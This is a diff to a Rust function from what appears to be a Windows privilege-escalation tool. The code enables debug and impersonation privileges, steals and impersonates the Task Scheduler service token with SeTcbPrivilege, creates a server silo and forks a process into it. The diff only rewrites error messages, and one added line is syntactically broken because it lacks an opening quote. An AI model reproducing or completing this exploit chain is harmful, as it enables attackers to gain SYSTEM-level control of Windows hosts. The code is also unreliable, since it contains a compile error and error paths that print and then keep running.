@@ -88,25 +88,25 @@ pub unsafe fn ExecuteCommand(cc: i32){
     let fr_res: BOOL = Common::EnablePrivilege(NULL, SE_IMPERSONATE_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
     let sc_res: BOOL = Common::EnablePrivilege(NULL, SE_DEBUG_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
     if fr_res == FALSE || sc_res == FALSE{
-        println!("ALL DONE");
+        println!("ERROR::MAIN::ENABLE::PRIVILEGES");
     }
     println!("Enabled required privileges.\n");
 
     let _res: BOOL = Common::OpenServiceToken("Schedule".as_ptr() as *mut u16,&mut h_schedule_token as *mut *mut c_void);
     if _res == FALSE{
-        println!("ALL DONE");
+        println!("ERROR::MAIN::OPEN_SERVICE_TOKEN_W::PRIVILEGES");
     }
     println!("Got Schedule service's token.\n");
 
     let _res: BOOL = Common::EnablePrivilege(h_schedule_token, SE_TCB_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
     if _res == FALSE{
-        println!("ALL DONE");
+        println!("ERROR::MAIN::ENABLE::PRIVILEGES::2");
     }
     println!("Enabled SeTcbPrivilege in token.\n");
 
     let _res: BOOL = Common::ImpresonateToken(h_schedule_token);
     if _res == FALSE{
-        println!("ALL DONE");
+        println!("ERROR::MAIN::IMPERSONATE_TOKEN::PRIVILEGES");
     }
     println!("Impersonating Schedule service...\n");
 
@@ -115,7 +115,7 @@ pub unsafe fn ExecuteCommand(cc: i32){
     if silo.IsInitialized() == FALSE {
         unsafe{RevertToSelf()};
         unsafe{CloseHandle(h_schedule_token)};
-        println!("ALL DONE");
+        println!(ERROR::MAIN::SILO_INIT::PRIVILEGES");
     }
     println!("Silo created and initialized (path is {:?})", silo.GetRootDirectory());
 
@@ -123,7 +123,7 @@ pub unsafe fn ExecuteCommand(cc: i32){
     if _res == FALSE {
         unsafe{RevertToSelf()};
         unsafe{CloseHandle(h_schedule_token)};
-        println!("ALL DONE");
+        println!("ERROR::MAIN::REVERT::IMPERSONATE");
     }
     println!("Revert impersonation");
 
@@ -135,7 +135,7 @@ pub unsafe fn ExecuteCommand(cc: i32){
     if ksec.IsInitialized() == FALSE{
         unsafe{RevertToSelf()};
         unsafe{CloseHandle(h_schedule_token)};
-        println!("ALL DONE");
+        println!("ERROR::MAIN:SILO::INIT");
     }
     println!("Ksec initialized");
 
@@ -143,7 +143,7 @@ pub unsafe fn ExecuteCommand(cc: i32){
     if _res == FALSE {
         unsafe{RevertToSelf()};
         unsafe{CloseHandle(h_schedule_token)};
-        println!("ALL DONE");
+        println!("ERROR::MAIN::FORK::PROCESS");
     }
     println!("Ok fork process into server silo");
 
